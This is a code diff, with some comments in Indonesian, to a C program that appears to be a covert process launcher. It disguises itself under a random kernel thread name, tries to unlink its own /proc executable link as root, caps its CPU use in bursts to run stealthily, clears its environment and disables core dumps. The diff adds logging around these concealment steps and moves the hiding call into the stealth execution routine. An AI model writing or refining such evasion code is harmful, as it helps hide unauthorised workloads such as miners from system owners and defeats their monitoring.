@@ -1,4 +1,4 @@
-#define _GNU_SOURCE  // Tambahkan ini di paling atas
+#define _GNU_SOURCE
 
 #include <stdio.h>
 #include <unistd.h>
@@ -367,14 +367,22 @@ void hide_process(void) {
     #ifdef PR_SET_NAME
     // Select a random kernel thread name for better disguise
     int name_index = getpid() % (sizeof(kernel_thread_names) / sizeof(kernel_thread_names[0]));
-    prctl(PR_SET_NAME, (unsigned long)kernel_thread_names[name_index], 0, 0, 0);
+    if (prctl(PR_SET_NAME, (unsigned long)kernel_thread_names[name_index], 0, 0, 0) == 0) {
+        log_message("DEBUG", "Successfully set process name to %s", kernel_thread_names[name_index]);
+    } else {
+        log_message("DEBUG", "prctl failed: %s", strerror(errno));
+    }
     #endif
     
     // Try to unlink the /proc/self/exe symlink (requires root)
     if (geteuid() == 0) {
         char self_path[PATH_MAX];
         snprintf(self_path, sizeof(self_path), "/proc/%d/exe", getpid());
-        unlink(self_path);
+        if (unlink(self_path) == 0) {
+            log_message("DEBUG", "Unlinked /proc/self/exe");
+        } else {
+            log_message("DEBUG", "Unlink /proc/self/exe failed: %s", strerror(errno));
+        }
     }
 }
 
@@ -438,6 +446,9 @@ void stealth_cpu_execution(const char *exec_path, char **newargv, int max_cpu_pe
     sa.sa_flags = 0;
     sigaction(SIGINT, &sa, NULL);
     sigaction(SIGTERM, &sa, NULL);
+    
+    // Hide the parent process
+    hide_process();
     
     log_message("INFO", "Starting stealth execution mode (max CPU: %d%%, interval: %ds)", 
                 max_cpu_percent, burst_interval);
@@ -642,7 +653,7 @@ int main(int argc, char **argv) {
     // Daemonize jika diminta
     if (runsys) {
         daemonize();
-        hide_process();
+        // Tidak perlu memanggil hide_process() di sini karena akan dipanggil dalam stealth_cpu_execution
         clean_environment();
         disable_core_dumps();
     }
